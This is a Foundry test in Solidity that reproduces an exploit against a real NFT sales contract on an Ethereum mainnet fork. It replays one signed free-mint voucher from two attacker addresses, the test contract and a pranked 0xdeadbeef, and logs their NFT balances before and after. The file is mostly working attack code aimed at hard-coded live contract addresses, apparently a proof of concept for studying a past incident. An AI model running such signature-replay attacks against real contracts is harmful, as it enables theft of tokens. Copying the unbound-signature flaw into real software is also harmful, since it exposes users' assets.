// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

interface ITheAssociationSales {
    struct vData {
        bool mint_free;
        uint256 max_mint;
        address from;
        uint256 start;
        uint256 end;
        uint256 eth_price;
        uint256 dust_price;
        bytes signature;
    }

    function mint_approved(vData memory info, uint256 number_of_items_requested, uint16 _batchNumber) external;
}

interface ITheAssociationToken {
    function balanceOf(address) external returns (uint256);
}

// forge test --fork-url https://eth.drpc.org --fork-block-number 14622842 -vvv
contract AssociationNFTExploit is Test {
    ITheAssociationSales associationSales = ITheAssociationSales(0xDD5A649fC076886Dfd4b9Ad6aCFC9B5eb882e83c);
    ITheAssociationToken associationToken = ITheAssociationToken(0x9b8b9c7C02be0bD0AA4D669bF6a1f6003424c6Dc);

    function testExploit() public {
        ITheAssociationSales.vData memory info;

        info.mint_free = true;
        info.max_mint = 1;
        info.from = 0xcE905feF61afB99e8A9d85BC3cd884b24a6cF041;
        info.start = 0;
        info.end = 5555555555;
        info.eth_price = 0;
        info.dust_price = 0;
        info.signature =
            hex"c8e695ef09e4531a5bc6dc3a29d313a44de89e23bb3c8cebc62ba0c16fe7e0e749f429cdd7d58df56f3856e128297216a4724e2f81e51eadb29850f0fd2bb8551c";

        address exploiter = address(0xdeadbeef);

        console.log("[Before Attack] First Attacker NFT Balance:", associationToken.balanceOf(address(this)));
        console.log("[Before Attack] Second Attacker NFT Balance:", associationToken.balanceOf(exploiter));

        // First Attacker
        associationSales.mint_approved(info, 1, 0);
        // Second Attacker
        vm.prank(exploiter);
        associationSales.mint_approved(info, 1, 0);

        console.log("[After Attack] First Attacker NFT Balance:", associationToken.balanceOf(address(this)));
        console.log("[After Attack] Second Attacker NFT Balance:", associationToken.balanceOf(exploiter));
    }
}
